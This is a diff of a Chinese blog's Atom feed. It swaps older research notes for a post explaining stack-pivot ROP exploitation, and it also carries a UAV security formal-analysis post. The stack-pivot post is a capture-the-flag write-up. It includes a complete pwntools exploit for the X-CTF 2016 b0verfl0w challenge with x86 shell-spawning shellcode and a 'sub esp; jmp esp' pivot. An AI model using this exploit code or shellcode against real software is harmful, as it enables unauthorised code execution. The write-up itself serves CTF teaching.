@@ -1,86 +1,165 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Shangfute's Blog</title><link href="http://shangfute.github.com/" rel="alternate"></link><link href="http://shangfute.github.com/feeds/all.atom.xml" rel="self"></link><id>http://shangfute.github.com/</id><updated>2017-09-14T21:16:00+08:00</updated><entry><title>认知论</title><link href="http://shangfute.github.com/recognition.html" rel="alternate"></link><published>2017-09-14T21:16:00+08:00</published><updated>2017-09-14T21:16:00+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-09-14:/recognition.html</id><summary type="html">&lt;p&gt;唯理论：从逻辑假设出发，进行推理。形式化方法。知识表示，逻辑推理，符号主义。无法处理不确定性。&lt;/p&gt;
-&lt;p&gt;经验论：从经验数据中总结公式。机器学习，深度学习。概率，连接主义。黑盒，不知道根据那些规则进行推理的，无法验证。&lt;/p&gt;
-&lt;p&gt;但是机器学习得出的结论，不够理性，无法知道事件之间潜在因果关系。不知道我是否知道，也不知道我是否不知道。我们如何知道我知道，如何知道我们不知道什么。深度学习需要大量训练数据才能工作，但人类只需要少量的sample就可以学到大量知识。&lt;/p&gt;
-&lt;p&gt;对概率推理进行建模。因为现在的CPS模型和攻击者模型十分复杂，难以使用数学公式进行建模。特别是对人（控制员和攻击者）的认知模型进行建模。&lt;/p&gt;
-&lt;p&gt;混合自动机的可达性分析：已知系统模型和规格的验证问题&lt;/p&gt;</summary><content type="html">&lt;p&gt;唯理论：从逻辑假设出发，进行推理。形式化方法。知识表示，逻辑推理，符号主义。无法处理不确定性。&lt;/p&gt;
-&lt;p&gt;经验论：从经验数据中总结公式。机器学习，深度学习。概率，连接主义。黑盒，不知道根据那些规则进行推理的，无法验证。&lt;/p&gt;
-&lt;p&gt;但是机器学习得出的结论，不够理性，无法知道事件之间潜在因果关系。不知道我是否知道，也不知道我是否不知道。我们如何知道我知道，如何知道我们不知道什么。深度学习需要大量训练数据才能工作，但人类只需要少量的sample就可以学到大量知识。&lt;/p&gt;
-&lt;p&gt;对概率推理进行建模。因为现在的CPS模型和攻击者模型十分复杂，难以使用数学公式进行建模。特别是对人（控制员和攻击者）的认知模型进行建模。&lt;/p&gt;
-&lt;p&gt;混合自动机的可达性分析：已知系统模型和规格的验证问题&lt;/p&gt;</content><category term="logic"></category><category term="learn"></category></entry><entry><title>CPS异常检测-形式化方法</title><link href="http://shangfute.github.com/CPS-Anomaly-Detection.html" rel="alternate"></link><published>2017-09-13T20:10:00+08:00</published><updated>2017-09-13T20:10:00+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-09-13:/CPS-Anomaly-Detection.html</id><summary type="html">&lt;p&gt;假设控制算法和估计算法的设计者十分了解物理系统，并且假设物理系统是线性系统。&lt;/p&gt;
-&lt;p&gt;但是，现在的CPS越来越复杂，并且存在人的影响，其行为很难预测，这些假设不一定成立。&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Shangfute's Blog</title><link href="http://shangfute.github.com/" rel="alternate"></link><link href="http://shangfute.github.com/feeds/all.atom.xml" rel="self"></link><id>http://shangfute.github.com/</id><updated>2017-11-27T19:29:33+08:00</updated><entry><title>劫持栈指针</title><link href="http://shangfute.github.com/Stack-pivot.html" rel="alternate"></link><published>2017-11-27T19:29:33+08:00</published><updated>2017-11-27T19:29:33+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-11-27:/Stack-pivot.html</id><summary type="html">&lt;p&gt;劫持栈指针（Stack pivot）就是改写rsp(esp)，使其指向其他位置。这样栈也就被劫持到攻击者控制的内存上去，然后在该位置做ROP。&lt;/p&gt;
+&lt;h2&gt;为什么要劫持栈指针？&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP&lt;/li&gt;
+&lt;li&gt;开启了PIE保护，栈地址未知，并且无法泄露，但是利用某些技术（如ret2dl-resolve）时，必须知道栈地址，可以通过stack pivot将栈劫持到相应的区域&lt;/li&gt;
+&lt;li&gt;其它漏洞难以利用，stack pivot 能够将一些非栈溢出的漏洞，变成栈溢出的漏洞，例如，将程序劫持到堆空间中。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;利用条件&lt;/h2&gt;
+&lt;p&gt;如果在尝试了直接Rop发现比较难实现，并且程序中有可以利用进行读写的函数，就可以考虑stack pivot stack pivot&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;可以控制程序执行流&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;存在地址已知，内容可控的Buffer&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;CPS的复杂性&lt;/li&gt;
-&lt;li&gt;人的复杂性建模  － 航管员&lt;/li&gt;
+&lt;li&gt;BSS，由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限&lt;/li&gt;
+&lt;li&gt;堆，但是需要我们能够泄露堆地址。&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;从数据中推理出能够区分想要的和不想要的行为的STL公式。
-公式可以指示出每个行为集合可能的原因。
-使用鲁棒度的概念在这个行为集合上进行有向搜索。&lt;/p&gt;
-&lt;p&gt;研究新的算法从数据中学习出STL规格，而STL规格可以使用自然语言解释。&lt;/p&gt;</summary><content type="html">&lt;p&gt;假设控制算法和估计算法的设计者十分了解物理系统，并且假设物理系统是线性系统。&lt;/p&gt;
-&lt;p&gt;但是，现在的CPS越来越复杂，并且存在人的影响，其行为很难预测，这些假设不一定成立。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;可以控制sp指针。一般来说 …&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;劫持栈指针（Stack pivot）就是改写rsp(esp)，使其指向其他位置。这样栈也就被劫持到攻击者控制的内存上去，然后在该位置做ROP。&lt;/p&gt;
+&lt;h2&gt;为什么要劫持栈指针？&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP&lt;/li&gt;
+&lt;li&gt;开启了PIE保护，栈地址未知，并且无法泄露，但是利用某些技术（如ret2dl-resolve）时，必须知道栈地址，可以通过stack pivot将栈劫持到相应的区域&lt;/li&gt;
+&lt;li&gt;其它漏洞难以利用，stack pivot 能够将一些非栈溢出的漏洞，变成栈溢出的漏洞，例如，将程序劫持到堆空间中。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;利用条件&lt;/h2&gt;
+&lt;p&gt;如果在尝试了直接Rop发现比较难实现，并且程序中有可以利用进行读写的函数，就可以考虑stack pivot stack pivot&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;可以控制程序执行流&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;存在地址已知，内容可控的Buffer&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;CPS的复杂性&lt;/li&gt;
-&lt;li&gt;人的复杂性建模  － 航管员&lt;/li&gt;
+&lt;li&gt;BSS，由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限&lt;/li&gt;
+&lt;li&gt;堆，但是需要我们能够泄露堆地址。&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;从数据中推理出能够区分想要的和不想要的行为的STL公式。
-公式可以指示出每个行为集合可能的原因。
-使用鲁棒度的概念在这个行为集合上进行有向搜索。&lt;/p&gt;
-&lt;p&gt;研究新的算法从数据中学习出STL规格，而STL规格可以使用自然语言解释。&lt;/p&gt;</content><category term="Signal Temporal Logic"></category><category term="Anomaly Detection"></category></entry><entry><title>概率程序分析</title><link href="http://shangfute.github.com/probablistic-program-analysis.html" rel="alternate"></link><published>2017-09-08T09:18:11+08:00</published><updated>2017-09-08T09:18:11+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-09-08:/probablistic-program-analysis.html</id><summary type="html">&lt;p&gt;研究对不确定性变量进行计算的程序。&lt;/p&gt;
-&lt;h1&gt;研究目标&lt;/h1&gt;
-&lt;p&gt;开发静态和动态分析技术，能够将概率程序看成随机过程进行推理。&lt;/p&gt;
-&lt;h1&gt;应用领域&lt;/h1&gt;
-&lt;ol&gt;
-&lt;li&gt;分析机器学习中使用的模型：当输入存在噪声时，分类器性能如何变化。&lt;/li&gt;
-&lt;li&gt;分析随机化计算：系统化建立随机算法的属性。&lt;/li&gt;
-&lt;li&gt;分析传感器数据融合算法：对融合算法进行推理。&lt;/li&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是&lt;/p&gt;
+&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;＃ 主要关注的问题&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ret&lt;/span&gt;
+&lt;span class="nf"&gt;jmp&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;
+&lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;
+&lt;span class="nf"&gt;sub&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb)  x/7i 0x000000000040061a
+0x40061a &amp;lt;__libc_csu_init+90&amp;gt;:  pop    rbx
+0x40061b &amp;lt;__libc_csu_init+91&amp;gt;:  pop    rbp
+0x40061c &amp;lt;__libc_csu_init+92&amp;gt;:  pop    r12
+0x40061e &amp;lt;__libc_csu_init+94&amp;gt;:  pop    r13
+0x400620 &amp;lt;__libc_csu_init+96&amp;gt;:  pop    r14
+0x400622 &amp;lt;__libc_csu_init+98&amp;gt;:  pop    r15
+0x400624 &amp;lt;__libc_csu_init+100&amp;gt;: ret
+(gdb)  x/7i 0x000000000040061d
+0x40061d &amp;lt;__libc_csu_init+93&amp;gt;:  pop    rsp
+0x40061e &amp;lt;__libc_csu_init+94&amp;gt;:  pop    r13
+0x400620 &amp;lt;__libc_csu_init+96&amp;gt;:  pop    r14
+0x400622 &amp;lt;__libc_csu_init+98&amp;gt;:  pop    r15
+0x400624 &amp;lt;__libc_csu_init+100&amp;gt;: ret
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;例1：X-CTF Quals 2016 - b0verfl0w&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://github.com/NUSGreyhats/xctf-2016-quals-challenges/tree/master/pwn/b0verfl0w"&gt;题目&lt;/a&gt;&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;随机化安全性：给定概率程序P和状态集合U，在N步内程序执行到U的概率是多少。&lt;/li&gt;
-&lt;li&gt;时序逻辑属性：研究以1的概率成立的时序逻辑属性，包括，几乎确定终止（程序以1的概率终止），几乎确定常返（程序无限次访问某个状态集合），几乎确定持续（程序执行到某个状态集合，并永远留在集合内），以及整改暂态属性体系。&lt;/li&gt;
+&lt;li&gt;查看程序的安全保护&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;＃ 研究途径&lt;/p&gt;
-&lt;p&gt;概率程序的符号化推理：通过符号化决策过程对概率程序的抽象语义进行推理。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="checksec" src="http://shangfute.github.com/images/k64-2017-11-27-21-02-09.png"&gt;&lt;/p&gt;
+&lt;p&gt;可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;signed&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;vul&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// [sp+18h] [bp-20h]@1&lt;/span&gt;
+
+  &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;======================&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Welcome to X-CTF 2016!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;======================&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;What&amp;#39;s your name?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Hello %s.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;利用栈溢出布置shellcode&lt;/li&gt;
+&lt;li&gt;控制eip指向shellcode处&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="gadgets" src="http://shangfute.github.com/images/k64-2017-11-27-21-09-36.png"&gt;&lt;/p&gt;
+&lt;p&gt;这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;那么我们payload中的最后一部分改如何设置esp呢，可以知道&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;size(shellcode+padding)=0x20&lt;/li&gt;
+&lt;li&gt;size(fake ebp)=0x4&lt;/li&gt;
+&lt;li&gt;size(0x08048504)=0x4&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以我们最后一段需要执行的指令就是&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt; &lt;span class="mi"&gt;0x28&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;
+&lt;span class="nf"&gt;jmp&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;所以最后的exp如下&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="n"&gt;sh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./b0verfl0w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;shellcode_x86&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode_x86&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;shellcode_x86&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x0b\xcd\x80&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+
+&lt;span class="n"&gt;sub_esp_jmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sub esp, 0x28;jmp esp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;jmp_esp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048504&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;shellcode_x86&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="mh"&gt;0x20&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode_x86&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bbbb&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;jmp_esp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sub_esp_jmp&lt;/span&gt;
+&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;例2：EkoPartyCTF 2016 fuckzing-exploit-200&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://github.com/ctfs/write-ups-2016/tree/master/ekoparty-ctf-2016/pwning/fuckzing-exploit-200"&gt;题目&lt;/a&gt;&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;使用符号化执行和解空间大小计算的方法根据有限的执行路径获得整个程序的属性。&lt;/li&gt;
-&lt;/ol&gt;</summary><content type="html">&lt;p&gt;研究对不确定性变量进行计算的程序。&lt;/p&gt;
-&lt;h1&gt;研究目标&lt;/h1&gt;
-&lt;p&gt;开发静态和动态分析技术，能够将概率程序看成随机过程进行推理。&lt;/p&gt;
-&lt;h1&gt;应用领域&lt;/h1&gt;
-&lt;ol&gt;
-&lt;li&gt;分析机器学习中使用的模型：当输入存在噪声时，分类器性能如何变化。&lt;/li&gt;
-&lt;li&gt;分析随机化计算：系统化建立随机算法的属性。&lt;/li&gt;
-&lt;li&gt;分析传感器数据融合算法：对融合算法进行推理。&lt;/li&gt;
+&lt;li&gt;查看程序的安全保护&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;＃ 主要关注的问题&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;随机化安全性：给定概率程序P和状态集合U，在N步内程序执行到U的概率是多少。&lt;/li&gt;
-&lt;li&gt;时序逻辑属性：研究以1的概率成立的时序逻辑属性，包括，几乎确定终止（程序以1的概率终止），几乎确定常返（程序无限次访问某个状态集合），几乎确定持续（程序执行到某个状态集合，并永远留在集合内），以及整改暂态属性体系。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;＃ 研究途径&lt;/p&gt;
-&lt;p&gt;概率程序的符号化推理：通过符号化决策过程对概率程序的抽象语义进行推理。&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;使用符号化执行和解空间大小计算的方法根据有限的执行路径获得整个程序的属性。&lt;/li&gt;
-&lt;/ol&gt;</content><category term="directions"></category></entry><entry><title>无人机安全形式化分析</title><link href="http://shangfute.github.com/UAV-security-formal-analysis.html" rel="alternate"></link><published>2017-09-07T09:18:11+08:00</published><updated>2017-09-07T09:18:11+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-09-07:/UAV-security-formal-analysis.html</id><summary type="html">&lt;p&gt;首先，精确定义UAV系统安全。针对通用UAV系统，识别出一组相对完全的安全属性，并且提供统一的格式。安全属性有两部分组成：攻击行为和想要的安全属性。
-然后，分析UAV系统是否安全。根据一组安全属性自动生成攻击行为，使用可达性和LTL属性对安全属性建模。&lt;/p&gt;
-&lt;p&gt;首先，收集UAV系统潜在的攻击方式。通过分析攻击的关联，识别原子攻击行为，使得所有攻击都是原子攻击的组合。利用攻击树形式化表示原子攻击的所有组合，构成全部可能的攻击。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="checksec" src="http://shangfute.github.com/images/k64-2017-11-27-20-30-26.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Ref&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others.htmlhttps://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others.html"&gt;stack pivot&lt;/a&gt;&lt;/p&gt;</content><category term="learn"></category><category term="ROP"></category></entry><entry><title>无人机安全形式化分析</title><link href="http://shangfute.github.com/UAV-security-formal-analysis.html" rel="alternate"></link><published>2017-11-07T19:29:33+08:00</published><updated>2017-11-07T19:29:33+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-11-07:/UAV-security-formal-analysis.html</id><summary type="html">&lt;p&gt;首先，精确定义UAV系统安全。针对通用UAV系统，识别出一组相对完全的安全属性，并且提供统一的格式。安全属性有两部分组成：攻击行为和想要的安全属性。 然后，分析UAV系统是否安全。根据一组安全属性自动生成攻击行为，使用可达性和LTL属性对安全属性建模。&lt;/p&gt;
+&lt;p&gt;收集UAV系统潜在的攻击方式。通过分析攻击的关联，识别原子攻击行为，使得所有攻击都是原子攻击的组合。利用攻击树形式化表示原子攻击的所有组合，构成全部可能的攻击。&lt;/p&gt;
 &lt;p&gt;提出从安全属性，自动生成攻击树的算法。然后根据攻击树生成攻击模型，并将每种攻击模型关联到相应的安全属性中。&lt;/p&gt;
 &lt;p&gt;每种攻击使用形式化语言CSP＃建模，每种安全属性形式化为可达性或暂态属性。根据系统模型、攻击模型和需要的安全属性，可以通过模型检查工具PAT验证系统在某种攻击下，是否满足安全属性。&lt;/p&gt;
-&lt;p&gt;创新点：
-1. 识别出相对完整的UAV系统的安全属性集合，考虑到了各种UAV系统中的子系统。
-2. 提出自动根据安全属性生成攻击树的算法，然后自动生成攻击模型。
-3. 验证系统。&lt;/p&gt;
+&lt;h2&gt;创新点&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;识别出相对完整的UAV系统的安全属性集合，考虑到了各种UAV系统中的子系统。 &lt;/li&gt;
+&lt;li&gt;提出自动根据安全属性生成攻击树的算法，然后自动生成攻击模型。 &lt;/li&gt;
+&lt;li&gt;验证系统。&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h2&gt;安全需求识别&lt;/h2&gt;
 &lt;p&gt;首先，识别UAV组件。UAV、地面站、飞行员、通信信道&lt;/p&gt;
-&lt;p&gt;对每个组件，识别 1. 安全保证 2 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;首先，精确定义UAV系统安全。针对通用UAV系统，识别出一组相对完全的安全属性，并且提供统一的格式。安全属性有两部分组成：攻击行为和想要的安全属性。
-然后，分析UAV系统是否安全。根据一组安全属性自动生成攻击行为，使用可达性和LTL属性对安全属性建模。&lt;/p&gt;
-&lt;p&gt;首先，收集UAV系统潜在的攻击方式。通过分析攻击的关联，识别原子攻击行为，使得所有攻击都是原子攻击的组合。利用攻击树形式化表示原子攻击的所有组合，构成全部可能的攻击。&lt;/p&gt;
+&lt;p&gt;对每个组件，识别 1. 安全保证 2. 攻击行为。&lt;/p&gt;
+&lt;p&gt;攻击行为之间可能存在关联：两个攻击结果相同、一个攻击依赖于另一个攻击 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;首先，精确定义UAV系统安全。针对通用UAV系统，识别出一组相对完全的安全属性，并且提供统一的格式。安全属性有两部分组成：攻击行为和想要的安全属性。 然后，分析UAV系统是否安全。根据一组安全属性自动生成攻击行为，使用可达性和LTL属性对安全属性建模。&lt;/p&gt;
+&lt;p&gt;收集UAV系统潜在的攻击方式。通过分析攻击的关联，识别原子攻击行为，使得所有攻击都是原子攻击的组合。利用攻击树形式化表示原子攻击的所有组合，构成全部可能的攻击。&lt;/p&gt;
 &lt;p&gt;提出从安全属性，自动生成攻击树的算法。然后根据攻击树生成攻击模型，并将每种攻击模型关联到相应的安全属性中。&lt;/p&gt;
 &lt;p&gt;每种攻击使用形式化语言CSP＃建模，每种安全属性形式化为可达性或暂态属性。根据系统模型、攻击模型和需要的安全属性，可以通过模型检查工具PAT验证系统在某种攻击下，是否满足安全属性。&lt;/p&gt;
-&lt;p&gt;创新点：
-1. 识别出相对完整的UAV系统的安全属性集合，考虑到了各种UAV系统中的子系统。
-2. 提出自动根据安全属性生成攻击树的算法，然后自动生成攻击模型。
-3. 验证系统。&lt;/p&gt;
+&lt;h2&gt;创新点&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;识别出相对完整的UAV系统的安全属性集合，考虑到了各种UAV系统中的子系统。 &lt;/li&gt;
+&lt;li&gt;提出自动根据安全属性生成攻击树的算法，然后自动生成攻击模型。 &lt;/li&gt;
+&lt;li&gt;验证系统。&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h2&gt;安全需求识别&lt;/h2&gt;
 &lt;p&gt;首先，识别UAV组件。UAV、地面站、飞行员、通信信道&lt;/p&gt;
 &lt;p&gt;对每个组件，识别 1. 安全保证 2. 攻击行为。&lt;/p&gt;
@@ -88,98 +167,296 @@
 &lt;p&gt;通过安全属性记录：安全保证和攻击行为之间关系。&lt;/p&gt;
